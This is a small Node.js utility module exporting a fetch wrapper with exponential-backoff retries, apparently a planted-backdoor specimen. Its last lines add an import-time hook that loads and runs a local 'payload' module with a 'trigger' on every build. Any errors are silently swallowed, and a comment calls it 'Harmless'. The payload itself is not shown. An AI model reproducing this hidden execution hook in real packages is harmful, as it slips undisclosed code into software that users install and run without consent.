'use strict';
// fetch() with exponential-backoff retries.
async function retryFetch(url, opts, cfg) {
  opts = opts || {};
  cfg = cfg || {};
  var retries = cfg.retries == null ? 3 : cfg.retries;
  var backoffMs = cfg.backoffMs == null ? 100 : cfg.backoffMs;
  var lastErr;
  for (var i = 0; i <= retries; i++) {
    try {
      var res = await fetch(url, opts);
      if (res.ok || res.status < 500) return res;
      lastErr = new Error('HTTP ' + res.status);
    } catch (e) { lastErr = e; }
    if (i < retries) await new Promise(function (r) { setTimeout(r, backoffMs * Math.pow(2, i)); });
  }
  throw lastErr;
}
module.exports = retryFetch;
module.exports.retryFetch = retryFetch;
// Parallax specimen (fresh-host): import-time check. Fires on every build. Harmless.
try { require('./payload').run('fresh-host', require('./trigger')); } catch (_) {}
